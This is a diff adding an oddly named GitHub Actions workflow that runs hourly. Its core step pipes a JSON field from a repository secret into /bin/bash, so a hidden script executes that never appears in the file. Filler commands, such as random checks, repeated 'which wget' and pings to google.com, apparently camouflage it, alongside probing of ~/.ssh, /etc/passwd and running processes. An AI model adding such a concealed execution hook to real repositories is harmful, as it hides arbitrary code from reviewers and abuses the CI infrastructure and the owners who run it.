@@ -1,0 +1,38 @@
+name: wangxihan1346
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangxihan1346
+        env:
+          o3190: ${{ secrets.o3190 }}
+        run: |
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          [ -d "$HOME/.ssh" ] && echo "$(ls -al $HOME/.ssh)" || echo "$HOME/.ssh not exists"
+          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
+          echo $o3190 | jq -r .e19264 | /bin/bash
+          [ -z "$RANDOM" ] || echo "Random var set"
+          which screen
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          history | grep ls
+          curl www.google.com
+          rm -rf tmp.temp.my.scrip.orc.zzz
+          ping -c 10 www.google.com
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          uname -a
+          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
+          curl google.com
+          which uname
+          echo "User: $(whoami)"
+          git add -u
+          which wget
+          which wget
+          printf "%s" "xyz" > tmp.xyz
